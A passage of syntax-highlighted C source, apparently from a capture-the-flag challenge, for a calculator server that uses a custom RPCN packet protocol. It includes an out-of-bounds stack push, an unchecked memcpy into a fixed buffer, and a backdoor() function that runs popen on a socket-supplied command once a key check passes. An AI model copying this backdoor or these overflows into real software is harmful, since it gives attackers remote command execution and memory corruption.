operator">&lt;=</span> <span class="token string">'9'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>c2 <span class="token operator">==</span> <span class="token string">'+'</span> <span class="token operator">||</span> c2 <span class="token operator">==</span> <span class="token string">'-'</span> <span class="token operator">||</span> c2 <span class="token operator">==</span> <span class="token string">'*'</span> <span class="token operator">||</span> c2 <span class="token operator">==</span> <span class="token string">'/'</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>c1 <span class="token operator">>=</span> <span class="token string">'0'</span> <span class="token operator">&amp;&amp;</span> c1 <span class="token operator">&lt;=</span> <span class="token string">'9'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> ret<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">push</span><span class="token punctuation">(</span>stack<span class="token operator">*</span> s<span class="token punctuation">,</span> <span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token operator">-></span>top <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        s<span class="token operator">-></span>top<span class="token operator">--</span><span class="token punctuation">;</span>        s<span class="token operator">-></span>pool<span class="token punctuation">[</span>s<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">priority</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> ret<span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token string">'('</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'*'</span><span class="token punctuation">:</span>        <span class="token keyword">case</span> <span class="token string">'/'</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'+'</span><span class="token punctuation">:</span>        <span class="token keyword">case</span> <span class="token string">'-'</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">')'</span><span class="token punctuation">:</span>            ret<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">0</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> ret<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">deal_data</span><span class="token punctuation">(</span>stack<span class="token operator">*</span> array<span class="token punctuation">,</span> stack<span class="token operator">*</span> opt<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> c <span class="token operator">=</span> opt<span class="token operator">-></span>pool<span class="token punctuation">[</span>opt<span class="token operator">-></span>top<span class="token punctuation">]</span><span class="token punctuation">;</span>    opt<span class="token operator">-></span>top<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> a <span class="token operator">=</span> array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span><span class="token punctuation">;</span>    array<span class="token operator">-></span>top<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> b <span class="token operator">=</span> array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token string">'+'</span><span class="token punctuation">:</span>            array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'-'</span><span class="token punctuation">:</span>            array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> b <span class="token operator">-</span> a<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'*'</span><span class="token punctuation">:</span>            array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> a <span class="token operator">*</span> b<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'/'</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>                array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> b <span class="token operator">/</span> a<span class="token punctuation">;</span>            <span class="token keyword">else</span>                array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token punctuation">:</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">calc</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> expr<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> result<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> <span class="token operator">*</span>temp<span class="token punctuation">,</span> <span class="token operator">*</span>str<span class="token punctuation">;</span>  <span class="token keyword">struct</span> <span class="token punctuation">{</span>        <span class="token keyword">char</span> dest<span class="token punctuation">[</span>BUF_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> buf<span class="token punctuation">[</span>BUF_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>        stack opt<span class="token punctuation">;</span>        stack array<span class="token punctuation">;</span>    <span class="token punctuation">}</span> var<span class="token punctuation">;</span>  var<span class="token punctuation">.</span>array<span class="token punctuation">.</span>top <span class="token operator">=</span> LENGTH<span class="token punctuation">;</span>  var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>top <span class="token operator">=</span> LENGTH<span class="token punctuation">;</span>  <span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">,</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> tmp <span class="token operator">=</span> <span class="token function">StrTrim</span><span class="token punctuation">(</span>expr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>buf<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>BUF_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>buf<span class="token punctuation">,</span>tmp<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> size <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">input_pass</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>buf<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  str <span class="token operator">=</span> var<span class="token punctuation">.</span>buf<span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>str <span class="token operator">-</span> var<span class="token punctuation">.</span>buf <span class="token operator">&lt;</span> size<span class="token punctuation">)</span>   <span class="token punctuation">{</span>    temp <span class="token operator">=</span> var<span class="token punctuation">.</span>dest<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>str <span class="token operator">-</span> var<span class="token punctuation">.</span>buf <span class="token operator">&lt;</span> size <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>str <span class="token operator">>=</span> <span class="token string">'0'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>str <span class="token operator">&lt;=</span> <span class="token string">'9'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token operator">*</span>temp <span class="token operator">=</span> <span class="token operator">*</span>str<span class="token punctuation">;</span>        temp<span class="token operator">++</span><span class="token punctuation">;</span>        str<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token operator">*</span>temp <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>var<span class="token punctuation">.</span>dest<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token function">myatoi</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>var<span class="token punctuation">.</span>array<span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>pool<span class="token punctuation">[</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>top<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'('</span> <span class="token operator">||</span> <span class="token function">priority</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>pool<span class="token punctuation">[</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>top<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token function">priority</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">*</span>str <span class="token operator">!=</span> <span class="token string">')'</span><span class="token punctuation">)</span>                                    <span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span>                var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>top<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">deal_data</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>var<span class="token punctuation">.</span>array<span class="token punctuation">,</span> <span class="token operator">&amp;</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>str <span class="token operator">==</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    str<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">sprintf</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> <span class="token string">"%lld"</span><span class="token punctuation">,</span> var<span class="token punctuation">.</span>array<span class="token punctuation">.</span>pool<span class="token punctuation">[</span>var<span class="token punctuation">.</span>array<span class="token punctuation">.</span>top<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">construct_result</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> key<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> length <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> packet <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>length<span class="token operator">+</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>packet<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>length<span class="token operator">+</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>packet<span class="token punctuation">,</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"RPCN"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>packet<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">p32</span><span class="token punctuation">(</span>length<span class="token operator">+</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>packet<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"\x00\x00\xbe\xf2"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>packet<span class="token operator">+</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">p32</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>packet<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span>key<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> packet<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">magiccmp</span><span class="token punctuation">(</span>byte b1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> byte b2<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>b1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!=</span>b2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> key<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span>  <span class="token keyword">int</span> k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">36</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span><span class="token punctuation">;</span>    k<span class="token operator">+</span><span class="token operator">=</span><span class="token number">23</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">bytecmp</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> a<span class="token punctuation">,</span><span class="token keyword">char</span><span class="token operator">*</span> b<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> length <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!=</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token keyword">int</span> sock<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> retry_packet<span class="token operator">=</span><span class="token string">"RPCN\x00\x00\x00\x0c\x00\x00\xbe\xf1"</span><span class="token punctuation">;</span>  byte<span class="token operator">*</span> buf  <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">37</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> cmd <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> key_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>key_len<span class="token operator">!=</span><span class="token number">36</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> retry_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">read</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span>key<span class="token punctuation">,</span> key_len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">encrypt</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">bytecmp</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span>EVIL_INS<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> retry_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">read</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> cmd_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>cmd_len<span class="token operator">></span><span class="token number">22</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> retry_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">read</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span>cmd<span class="token punctuation">,</span> cmd_len<span class="token punctuation">)</span><span class="token punctuation">;</span>  FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> output <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fp <span class="token operator">=</span> <span class="token function">popen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>      <span class="token function">fgets</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> output<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">pclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> retry_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockConn<span class="token punctuation">,</span> MQ mq<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> starting <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> error_packet<span class="token operator">=</span><span class="token string">"RPCN\x00\x00\x00\x0c\x00\x00\xbe\xf0"</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> retry_packet<span class="token operator">=</span><span class="token string">"RPCN\x00\x00\x00\x0c\x00\x00\xbe\xf1"</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> done_packet<span class="token operator">=</span><span class="token string">"RPCN\x00\x00\x00\x0c\x00\x00\xbe\xef"</span><span class="token 